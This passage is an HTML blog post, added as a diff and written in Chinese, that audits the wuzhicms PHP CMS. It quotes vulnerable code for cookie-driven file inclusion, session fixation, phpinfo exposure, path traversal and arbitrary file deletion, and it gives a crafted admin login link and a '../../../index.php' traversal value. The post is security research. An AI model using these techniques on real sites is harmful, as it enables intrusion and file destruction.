@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>wuzhicms 代码审计 | xvsf</title>
+<meta name="keywords" content="PHP 代码审计">
+<meta name="description" content="wuzhicms 代码审计">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/xvsf/posts_backup/wuzhicms/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts_backup/wuzhicms/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      wuzhicms 代码审计
+    </h1>
+    <div class="post-description">
+      wuzhicms 代码审计
+    </div>
+    <div class="post-meta"><span title='2025-07-20 17:00:00 +0000 UTC'>July 20, 2025</span>&nbsp;·&nbsp;<span>5 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="wuzhicms-代码审计">wuzhicms 代码审计<a hidden class="anchor" aria-hidden="true" href="#wuzhicms-代码审计">#</a></h1>
+<h1 id="根目录分析">根目录分析<a hidden class="anchor" aria-hidden="true" href="#根目录分析">#</a></h1>
+<p>api					API接口，找未授权、SQL注入
+caches			 缓存目录
+configs			配置文件
+coreframe		框架核心代码
+install				安装目录，安装后应删除
+map				
+promote
+res					静态资源
+uploadfile		上传文件储存目录，文件上传漏洞</p>
+<h1 id="分析代码参考readmemd">分析代码(参考README.md)<a hidden class="anchor" aria-hidden="true" href="#分析代码参考readmemd">#</a></h1>
+<p>程序模块结构说明</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">|--</span> <span class="n">coreframe</span>                   <span class="c1">#框架目录</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">app</span>                     <span class="c1">#模块（应用程序）目录</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">affiche</span>             <span class="c1">#公告模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">appshop</span>             <span class="c1">#应用商城</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">attachment</span>          <span class="c1">#附件模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">collect</span>             <span class="c1">#采集器</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">content</span>             <span class="c1">#内容模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">core</span>                <span class="c1">#核心模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">coupon</span>              <span class="c1">#优惠券模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">credit</span>              <span class="c1">#积分模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">database</span>            <span class="c1">#数据库模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">dianping</span>            <span class="c1">#点评模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">guestbook</span>           <span class="c1">#留言板模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">link</span>                <span class="c1">#友情链接模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">linkage</span>             <span class="c1">#联动菜单</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">member</span>              <span class="c1">#会员模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">message</span>             <span class="c1">#站内短信模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">mobile</span>              <span class="c1">#移动手机模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">order</span>               <span class="c1">#订单模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">pay</span>                 <span class="c1">#支付模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">ppc</span>                 <span class="c1">#推广模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">receipt</span>             <span class="c1">#发票申请模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">search</span>              <span class="c1">#全站搜索模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">sms</span>                 <span class="c1">#短信模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">|--</span> <span class="n">tags</span>                <span class="c1">#tags模块</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|</span>   <span class="o">---</span> <span class="n">template</span>            <span class="c1">#在线模板编辑</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">configs</span>                 <span class="c1">#框架配置</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">core</span><span class="o">.</span><span class="n">php</span>                <span class="c1">#框架入口</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">crontab</span>                 <span class="c1">#定时脚本目录</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">crontab</span><span class="o">.</span><span class="n">php</span>             <span class="c1">#定时脚本入口</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">extend</span>                  <span class="c1">#扩展目录</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">languages</span>               <span class="c1">#语言包</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">---</span> <span class="n">templates</span>               <span class="c1">#模板</span>
+</span></span><span class="line"><span class="cl"><span class="o">|--</span> <span class="n">caches</span>                      <span class="c1">#缓存目录</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">_cache_</span>                 <span class="c1">#公共缓存</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">block</span>                   <span class="c1">#区块、碎片缓存</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">content</span>                 <span class="c1">#内容模块缓存，栏目缓存</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">db_bak</span>                  <span class="c1">#数据库备份路径</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">install</span><span class="o">.</span><span class="n">check</span>           <span class="c1">#安装锁定</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">|--</span> <span class="n">model</span>                   <span class="c1">#模型缓存</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="o">---</span> <span class="n">templates</span>               <span class="c1">#模板缓存</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="n">www</span>                         <span class="c1">#网站根目录</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="mf">404.</span><span class="n">html</span>                <span class="c1">#404页面</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>               <span class="c1">#后台入口</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">api</span>                     <span class="c1">#api目录</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">configs</span>                 <span class="c1">#网站配置</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">favicon</span><span class="o">.</span><span class="n">ico</span>             <span class="c1">#浏览器icon</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span>              <span class="c1">#网站首页</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>               <span class="c1">#动态地址首页</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">res</span>                     <span class="c1">#静态资源</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">robots</span><span class="o">.</span><span class="n">txt</span>              <span class="c1">#搜索引擎防抓取规则</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|--</span> <span class="n">uploadfile</span>              <span class="c1">#附件</span>
+</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="o">--</span> <span class="n">web</span><span class="o">.</span><span class="n">php</span>                 <span class="c1">#自定义路由</span>
+</span></span></code></pre></div><h2 id="app-模块应用程序目录">app/ #模块（应用程序）目录<a hidden class="anchor" aria-hidden="true" href="#app-模块应用程序目录">#</a></h2>
+<p>先去核心模块看</p>
+<h3 id="coreframeappcoreadminindexphp后台登录首页">coreframe/app/core/admin/index.php	后台登录首页<a hidden class="anchor" aria-hidden="true" href="#coreframeappcoreadminindexphp后台登录首页">#</a></h3>
+<p>因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$lang</span> <span class="o">=</span> <span class="nx">get_cookie</span><span class="p">(</span><span class="s1">&#39;lang&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">get_cookie</span><span class="p">(</span><span class="s1">&#39;lang&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">LANG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">require</span> <span class="nx">COREFRAME_ROOT</span><span class="o">.</span><span class="s1">&#39;languages/&#39;</span><span class="o">.</span><span class="nv">$lang</span><span class="o">.</span><span class="s1">&#39;/admin_menu.lang.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">left</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$lang</span> <span class="o">=</span> <span class="nx">get_cookie</span><span class="p">(</span><span class="s1">&#39;lang&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">get_cookie</span><span class="p">(</span><span class="s1">&#39;lang&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">LANG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">require</span> <span class="nx">COREFRAME_ROOT</span><span class="o">.</span><span class="s1">&#39;languages/&#39;</span><span class="o">.</span><span class="nv">$lang</span><span class="o">.</span><span class="s1">&#39;/admin_menu.lang.php&#39;</span><span class="p">;</span>              
+</span></span></code></pre></div><p>此处是ai发现的一个漏洞，实际上很难触发，记录：</p>
+<ol>
+<li>登录成功后不生成新session ID</li>
+<li>直接重用攻击者提供的session ID</li>
+</ol>
+<p>利用：</p>
+<ol>
+<li>攻击者获取自己的session ID：<code>PHPSESSID=attacker_sess</code></li>
+<li>构造钓鱼链接：</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://target.com/admin/?m=core&amp;f=index&amp;v=login&amp;submit=1&amp;checkcode=...[有效验证码]...&amp;username=admin&amp;password=123456
+</span></span></code></pre></div><ol>
+<li>诱使管理员点击链接（含攻击者的session ID）</li>
+<li>管理员登录后，攻击者使用相同的<code>PHPSESSID</code>即可直接进入管理员账户</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//登录
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">login</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//已经登陆的用户重定向到后台首页
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;already login&#39;</span><span class="p">),</span> <span class="s1">&#39;?m=core&amp;f=index&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">su</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="o">...</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>		
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。</p>
+<p>路由：</p>
+<p><code>http://wuzhicms:7575/index.php?m=core&amp;f=index&amp;_su=wuzhicms&amp;v=phpinfo</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 显示 phpinfo 内容
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">phpinfo</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p><img alt="20250717125939730" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png"></p>
+<h3 id="coreframeappappupdateadminindexphp">coreframe/app/appupdate/admin/index.php<a hidden class="anchor" aria-hidden="true" href="#coreframeappappupdateadminindexphp">#</a></h3>
+<p>如果 $filePath 为 ../../../index.php，则 COREFRAME_ROOT . &lsquo;../../../index.php&rsquo; 就可以指向系统目录外的敏感文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">_deleteFilesForPackageUpdate</span><span class="p">(</span><span class="nv">$packageDir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesystem</span><span class="o">-&gt;</span><span class="na">exists</span><span class="p">(</span><span class="nv">$packageDir</span><span class="o">.</span><span class="s1">&#39;/delete&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$handle</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$packageDir</span><span class="o">.</span><span class="s1">&#39;/delete&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nv">$filePath</span> <span class="o">=</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$filePath</span><span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;coreframe&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$fullPath</span> <span class="o">=</span> <span class="nx">COREFRAME_ROOT</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesystem</span><span class="o">-&gt;</span><span class="na">exists</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesystem</span><span class="o">-&gt;</span><span class="na">remove</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;www&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$fullPath</span> <span class="o">=</span> <span class="nx">WWW_ROOT</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesystem</span><span class="o">-&gt;</span><span class="na">exists</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filesystem</span><span class="o">-&gt;</span><span class="na">remove</span><span class="p">(</span><span class="nv">$fullPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><h1 id="搜关键字">搜关键字<a hidden class="anchor" aria-hidden="true" href="#搜关键字">#</a></h1>
+<h2 id="文件安全">文件安全：<a hidden class="anchor" aria-hidden="true" href="#文件安全">#</a></h2>
+<h3 id="任意文件删除">任意文件删除<a hidden class="anchor" aria-hidden="true" href="#任意文件删除">#</a></h3>
+<p>搜索del() -&gt; coreframe/app/attachment/admin/index.php -&gt; del()</p>
+<p>有可控变量 $url</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">del</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$id</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="c1">//从全局变量 $GLOBALS 中获取 id 和 url
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">remove_xss</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="c1">//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$id</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$url</span><span class="p">)</span> <span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_failure&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span><span class="c1">//判断是否都为空
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span><span class="c1">//按 id 删除
+</span></span></span><span class="line"><span class="cl">        	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$id</span><span class="p">))</span> <span class="p">{</span><span class="c1">//将 id 转化为数组
+</span></span></span><span class="line"><span class="cl">				<span class="nv">$ids</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$ids</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">foreach</span><span class="p">(</span><span class="nv">$ids</span> <span class="k">as</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$where</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$att_info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="nv">$where</span><span class="p">,</span> <span class="s1">&#39;usertimes,path&#39;</span><span class="p">);</span><span class="c1">//从 attachment 表中查找该 id的记录并取usertimes 和 path
+</span></span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="nv">$att_info</span><span class="p">[</span><span class="s1">&#39;usertimes&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">//若引用数大于 1，只减少使用次数，不删除物理文件
+</span></span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">update</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="s1">&#39;usertimes = usertimes-1&#39;</span><span class="p">,</span> <span class="nv">$where</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="c1">//否则，彻底删除
+</span></span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">my_unlink</span><span class="p">(</span><span class="nx">ATTACHMENT_ROOT</span> <span class="o">.</span> <span class="nv">$att_info</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="nv">$where</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span><span class="s1">&#39;attachment_tag_index&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;att_id&#39;</span><span class="o">=&gt;</span><span class="nv">$id</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
